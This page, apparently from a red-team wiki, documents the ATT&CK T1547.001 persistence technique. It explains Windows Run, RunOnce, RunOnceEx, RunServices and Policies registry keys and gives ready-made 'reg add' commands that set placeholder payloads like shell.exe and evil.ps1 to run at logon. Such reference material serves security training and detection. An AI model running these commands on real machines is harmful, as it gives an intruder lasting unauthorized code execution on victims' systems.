---
description: >-
  MITRE ATT&CK™ Boot or Logon Autostart Execution: Registry Run Keys / Startup
  Folder - Technique T1547.001
---

# Run Keys

## Theory&#x20;

We may achieve persistence by referencing a program with a Registry run key. Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.

## Practice

{% hint style="success" %}
Registry entries under `HKU/HKCU` will only apply to the user.\
Registry entries under `HKLM` will apply to everyone
{% endhint %}

{% hint style="info" %}
**Run/RunServices** keys will run every time a user logs in.

**RunOnce/RunServicesOnce** will clears the registry key as soon as it run.
{% endhint %}

{% tabs %}
{% tab title="Run/RunOnce/RunOnceEx" %}
You can force a user to execute a program on logon via the **Run** and **RunOnce** and **RunOnceEx** registry keys. You can use the following registry entries to specify applications to run at logon:

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`

The **RunOnceEx** key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a "Depend" key with RunOnceEx.

{% hint style="info" %}
RunOnceEx only executes from HKEY\_LOCAL\_MACHINE (HKLM)

RunOnceEx clears the registry key on completion of the command.
{% endhint %}

```bash
#Run/RunOnce
## Add key for current user
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v PeMalware /t REG_SZ /d "C:\Users\user1\shell.exe"
## Add key for computer (all users)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v PeMalware /t REG_SZ /d "C:\Users\user1\shell.exe"

#RunOnceEx
#Add key for current user - Execute command / PE
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v PeMalware /t REG_SZ /d "C:\tmp\shell.exe"
#Add key for computer (all users) - Execute DLL
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001Depend" /v DLLMalware /t REG_SZ /d "C:\tmp\shell.dll"
```
{% endtab %}

{% tab title="RunServices/RunServicesOnce " %}
The following Registry keys can control automatic startup of services during boot:

* `HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`

```powershell
#Add key for current user - Execute command / PE
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Pwned /t REG_SZ /d "C:\tmp\Pwned.exe"

#Add key for computer (all users) - Execute command / PE
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Pwned /t REG_SZ /d "C:\tmp\Pwned.exe"
```
{% endtab %}

{% tab title="Policies" %}
We can use policy settings to specify startup programs with following registry keys

* HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
* HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

```powershell
#Add key for current user - Execute command / PE
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v Pwned /t REG_SZ /d "C:\tmp\Pwned.exe"

#Add key for computer (all users) - Execute command
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v Pwned /t REG_SZ /d "powershell.exe C:\tmp\evil.ps1"
```
{% endtab %}
{% endtabs %}

## References

{% embed url="https://attack.mitre.org/techniques/T1547/001/" %}
